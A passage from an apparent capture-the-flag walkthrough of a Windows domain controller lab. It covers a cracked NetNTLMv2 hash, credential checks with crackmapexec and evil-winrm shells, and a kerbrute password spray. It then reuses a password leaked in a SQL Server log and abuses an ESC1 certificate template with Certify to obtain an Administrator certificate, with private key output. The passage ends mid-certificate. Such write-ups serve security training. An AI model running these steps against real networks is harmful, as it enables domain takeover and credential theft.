sql_svc:REGGIE1234ronnie:sequel:3079d7abc1e76fd1:F1DC2CCD6DAF7566BBFC006F7A57E25B:010100000000000080DF42A3C72EDB01AD9B53DC4B9F73F4000000000200080041004B005600360001001E00570049004E002D00460042003900390056004C003100390034004B00350004003400570049004E002D00460042003900390056004C003100390034004B0035002E0041004B00560036002E004C004F00430041004C000300140041004B00560036002E004C004F00430041004C000500140041004B00560036002E004C004F00430041004C000700080080DF42A3C72EDB0106000400020000000800300030000000000000000000000000300000CA0025C0D4F4AEF83F638FA758034163CBFB4D3B1A73594B9C87DDB97CA3DC7E0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000

1 password hash cracked, 0 left
```

`crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie ←
```

`crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --shares`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL          READ            Logon server share
```

`crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' -x 'whoami'`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
```
❌

`tcpdump -i tun0 icmp -n`:
```
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```

`crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' -x 'ping -n 3 10.10.16.3'`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
```
❌

`crackmapexec winrm 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`:
```
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
HTTP        10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!) ←
```

`evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'`:
```                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\sql_svc\Documents>
```

![Victim: sql_svc](https://custom-icon-badges.demolab.com/badge/Victim-sql%5F_svc-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
sequel\sql_svc
```

`dir C://Users/sql_svc/Desktop`:
```
```
❌

`whoami /all`:
```
USER INFORMATION
----------------

User Name      SID
============== ==============================================
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`dir C://Users/`:
```
    Directory: C:\Users


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper ←
d-----         2/7/2023   8:10 AM                sql_svc
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper ←            sql_svc ←                Tom.Henn
The command completed with one or more errors.
```

`net user sql_svc`:
```
User name                    sql_svc ←
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2022 1:13:13 PM
Password expires             Never
Password changeable          11/19/2022 1:13:13 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/4/2024 9:25:02 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users ←
The command completed successfully.
```

`net user ryan.cooper`:
```
User name                    Ryan.Cooper ←
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/1/2023 1:52:57 PM
Password expires             Never
Password changeable          2/2/2023 1:52:57 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   11/4/2024 4:11:03 PM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users ←
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`crackmapexec smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie' --users`:
``` 
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie 
SMB         10.10.11.202    445    DC               [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.11.202    445    DC               [+] Enumerated domain user(s)
SMB         10.10.11.202    445    DC               sequel.htb\Administrator                  Built-in account for administering the computer/domain
SMB         10.10.11.202    445    DC               sequel.htb\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.11.202    445    DC               sequel.htb\krbtgt                         Key Distribution Center Service Account
SMB         10.10.11.202    445    DC               sequel.htb\Tom.Henn                       
SMB         10.10.11.202    445    DC               sequel.htb\Brandon.Brown                  
SMB         10.10.11.202    445    DC               sequel.htb\Ryan.Cooper ←                   
SMB         10.10.11.202    445    DC               sequel.htb\sql_svc                        
SMB         10.10.11.202    445    DC               sequel.htb\James.Roberts                  
SMB         10.10.11.202    445    DC               sequel.htb\Nicole.Thompson   
```

`kerbrute bruteuser --dc 10.10.11.202 -d 'sequel.htb' /usr/share/wordlists/rockyou.txt 'Ryan.Cooper'`:
```
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 11/04/24 - Ronnie Flathers @ropnop

2024/11/04 16:47:51 >  Using KDC(s):
2024/11/04 16:47:51 >   10.10.11.202:88

2024/11/04 16:51:10 >  [!] Ryan.Cooper@sequel.htb: - client has neither a keytab nor a password set and no session
2024/11/04 16:51:11 >  Done! Tested 4762 logins (0 successes) in 199.875 seconds
```
❌

![Victim: sql_svc](https://custom-icon-badges.demolab.com/badge/Victim-sql%5F_svc-64b5f6?logo=windows11&logoColor=white)

`dir C://`:
```
    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/1/2023   8:15 PM                PerfLogs
d-r---         2/6/2023  12:08 PM                Program Files
d-----       11/19/2022   3:51 AM                Program Files (x86)
d-----       11/19/2022   3:51 AM                Public
d-----         2/1/2023   1:02 PM                SQLServer ←
d-r---         2/1/2023   1:55 PM                Users
d-----         2/6/2023   7:21 AM                Windows
```

`dir C://SQLServer/Logs`:
```
    Directory: C:\SQLServer\Logs


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK ←
```

`type C://SQLServer/Logs/ERRORLOG.BAK`:
```
2022-11-18 13:43:05.96 Server      Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
        Sep 24 2019 13:48:23 
        Copyright (C) 2019 Microsoft Corporation
        Express Edition (64-bit) on Windows Server 2019 Standard Evaluation 10.0 <X64> (Build 17763: ) (Hypervisor)

[...]

2022-11-18 13:43:07.39 spid51      Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
2022-11-18 13:43:07.44 spid51      Changed database context to 'master'.
2022-11-18 13:43:07.44 spid51      Changed language setting to us_english.
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1] ←
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1] ←

[...]
```

`crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 ←
```

`crackmapexec smb 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3' --shares`:
```
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL          READ            Logon server share
```

`crackmapexec winrm 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'`:
```
SMB         10.10.11.202    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:sequel.htb)
HTTP        10.10.11.202    5985   DC               [*] http://10.10.11.202:5985/wsman
HTTP        10.10.11.202    5985   DC               [+] sequel.htb\Ryan.Cooper:NuclearMosquito3 (Pwn3d!) ←
```

`evil-winrm -i 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'`:
```                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint ←
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents>
```

![Victim: ryan.cooper](https://custom-icon-badges.demolab.com/badge/Victim-ryan.cooper-64b5f6?logo=windows11&logoColor=white)

`whoami`:
```
sequel\ryan.cooper
```

`dir C://Users/Ryan.Cooper/Desktop`:
```
    Directory: C:\Users\Ryan.Cooper\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        11/4/2024   9:25 AM             34 user.txt ←
```

`type C://Users/Ryan.Cooper/Desktop/user.txt`:
```
8d04a*************************** ←
```

`whoami /all`:
```
USER INFORMATION
----------------

User Name          SID
================== ==============================================
sequel\ryan.cooper S-1-5-21-4078382237-1492182817-2568127209-1105


GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

`net group`:
```
Group Accounts for \\

-------------------------------------------------------------------------------
*Cloneable Domain Controllers
*DnsUpdateProxy
*Domain Admins
*Domain Computers
*Domain Controllers
*Domain Guests
*Domain Users
*Enterprise Admins
*Enterprise Key Admins
*Enterprise Read-only Domain Controllers
*Group Policy Creator Owners
*Key Admins
*Protected Users
*Read-only Domain Controllers
*Schema Admins
The command completed with one or more errors.
```

`net localgroup`:
```
Aliases for \\DC

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers ←
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compatible Access
*Print Operators
*RAS and IAS Servers
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Server Operators
*SQLServer2005SQLBrowserUser$DC
*Storage Replica Administrators
*Terminal Server License Servers
*Users
*Windows Authorization Access Group
The command completed successfully.
```

`net localgroup "Cert Publishers"`:
```
Alias name     Cert Publishers
Comment        Members of this group are permitted to publish certificates to the directory

Members

-------------------------------------------------------------------------------
DC$ ←
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`cp ~/tools/SharpCollection/NetFramework_4.7_Any/Certify.exe ./certify.exe`

`upload ./certify.exe`:
```
Info: Uploading /home/kali/certify.exe to C:\Users\Ryan.Cooper\Documents\certify.exe
                                        
Data: 238248 bytes of 238248 bytes copied
                                        
Info: Upload successful!
```

![Victim: ryan.cooper](https://custom-icon-badges.demolab.com/badge/Victim-ryan.cooper-64b5f6?logo=windows11&logoColor=white)

Now, we can start enumerating possible Certificate Authorities.

`./certify.exe cas`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate authorities
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'


[*] Root CAs

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb ←
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb



[*] NTAuthCertificates - Certificates that enable authentication:

    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb


[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None


    Enabled Certificate Templates:
        UserAuthentication
        DirectoryEmailReplication
        DomainControllerAuthentication
        KerberosAuthentication
        EFSRecovery
        EFS
        DomainController
        WebServer
        Machine
        User
        SubCA
        Administrator



Certify completed in 00:00:34.8113031
```

We were right, there is a CA on the remote machine. We can use `Certify` once again to enumerate vulnerable certificates.

`./certify.exe find /vulnerable`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA ←
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA ←
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                : ←
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11 ←
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication ←
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag           : ENROLLEE_SUPPLIES_SUBJECT ←
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0 ←
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:11.5008049
```

We can indeed see that there actually is a vulnerable template called `UserAuthentication` . In particular we can see that `Authenticated Users` can enroll for this template and since the `msPKI-Certificate-Name-Flag` is present and contains `ENROLLEE_SUPPLIES_OBJECT` the template is vulnerable to the ESC1 scenario. Essentially, this allows anyone to enroll in this template and specify an arbitrary Subject Alternative Name. Meaning that, we could authenticate as a Domain Admin by exploiting this attack path.
To exploit this, we can use either `Certify` or `certipy`.

`./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator`:
```
   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication ←
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb ←
[*] AltName                 : Administrator ←

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA ←

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 13

[*] cert.pem         : ←

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAvMth4TPg4/SdSzZsV0PsL7iaXd28vAKO5BFLPC7n5LCv417C
D6zaP0U5zm7Umq0HnIAooWQWscmRz6jwbk1BKEK55KXVzFGZcTjIc/CZuOSV3X4U
DWcUiftL5kVan/LajvhZ1wPDALbbeNIM5frLCF+mWFBGOa2uchqciQb27/CQP0jS
QBGChSxuo5cBFhfjK7xRn8/SPfPqa5Jpub2tmpnEfS+OKHsqV7WTMjOwaZqzFsy1
ptOw1rSj5XYD19coMCAhRMl60uyLklPVU0puxFmHfx09qaD75TYH4+nGf0oBBZXS
w/su/zTwD+pmhwAqxMm9PRzBvl4r83ZwWSHmAQIDAQABAoIBAHapAgkQmU3NRjuq
pienCkDoLyXGI0Sr+vF/qSDXfmqvXq1ytlgx1S6lLPMBl+Dr1ffYWTEu/lCaF2pE
jXFWXxiV7861KI51zxJplRvB4mxiR4tiHepamn8rEgZWGuKjOhlYIOdSdvLw+zqS
EwdNPOUzcRLayXihIB6ZeT9qwDQHkrIMMPia4ju+IKCnOD6E60NO9WcNs1DPeEZL
lrUyadOD7aPNsRMgBRPfC6zvaz/lm5fEmE0tMVO3lwGH1UXGTVlIUgaKuoZmfx4S
MFlAuQcSspf+RElxp1820DyWdlmhsD6BLjXN0cw41LleZfPVpA4yiirhIYuxYD+t
jYHLM10CgYEAyLeeSBk1tgVsyhPzDUDYXnB8UadVc4pAblyofJ+IR1M/FogGunKI
TAzmTEvqCjh9dyqHCrES25y5c28itgbXt7AwHl2PnqnGG602pIK/LYEUsspL1CRR
jBLm/IXsUoaudJnLXdgT79poq4FHiWwVFkAlBDjUCi902fiGiNxM5scCgYEA8MsZ
XVGDP80UOELAAeSRJAmwAFS9ARucNYa4X9aAjoiM8fA9zAe7C10cp+ipRXEXfqAr
Pc1Q0u8JH/xSGw+z/TvRSfc/605HMvdfJCCOBmooUzHlDk/bG0SYJecJrAeF88yh
Kpc+OjPdgib9G+ZJUXAmKMJJH+PDvSHAL0lq5PcCgYEAtiB/HDbb2NVlWJvvgEgl
zNPOypzG2fdJ7ZpgO+zaULYF2eEGEepZKIDP+80qiammlxncvWPdk67LTCY83eSp
mwDhOLx21GaC35w1p+MHrDejW3RaiB2IbUy9kcfHnz6cUCs5MGcf+BU7wtuk2Npc
6/q6W/Fg3fkf06VCFi+oDAMCgYEAnP8vGIMPGkgySMRswE8wuth+Ipkdal2AKf4e
tI383/H0Q8Kp6B+aOryI9Ilj5FzqPqtbxj3Z1s33mx0+w1ontpKL0LgeuuMc1QQo
yjtXnqMUi7naaMx0RYEh2oSa78kv81eWNVjLP9OVN0kIempZn3mJx8V1PA+bDfO1
hJ9PzN0CgYEAs1nHBbzA84VMrghmzzi7RcuyGMMnqbwqNUYWJqXlq/UKDSx2/66V
nV1hi71CR922ItOiqepJ6cp3yUpGIl879Zou290e+/UjLBsBqi1rcZslvGOk/PdK
LPB+N0rnVI6X/oEk5PZmXdsEp0xXf+SX7EtXcX1TpIn0JEtdkasCRZA=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAA01Cs7rQAVycwAAAAAADTANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjQxMTA1MTgyNzMyWhcNMzQxMTAz
MTgyNzMyWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC8y2HhM+Dj9J1LNmxXQ+wvuJpd
3by8Ao7kEUs8LufksK/jXsIPrNo/RTnObtSarQecgCihZBaxyZHPqPBuTUEoQrnk
pdXMUZlxOMhz8Jm45JXdfhQNZxSJ+0vmRVqf8tqO+FnXA8MAttt40gzl+ssIX6ZY
UEY5ra5yGpyJBvbv8JA/SNJAEYKFLG6jlwEWF+MrvFGfz9I98+prkmm5va2amcR9
L44oeypXtZMyM7BpmrMWzLWm07DWtKPldgPX1ygwICFEyXrS7IuSU9VTSm7EWYd/
HT2poPvlNgfj6cZ/SgEFldLD+y7/NPAP6maHACrEyb09HMG+XivzdnBZIeYBAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZQIBBDApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFe4tenVO4e2EFU7bWZO5UVW3Tva
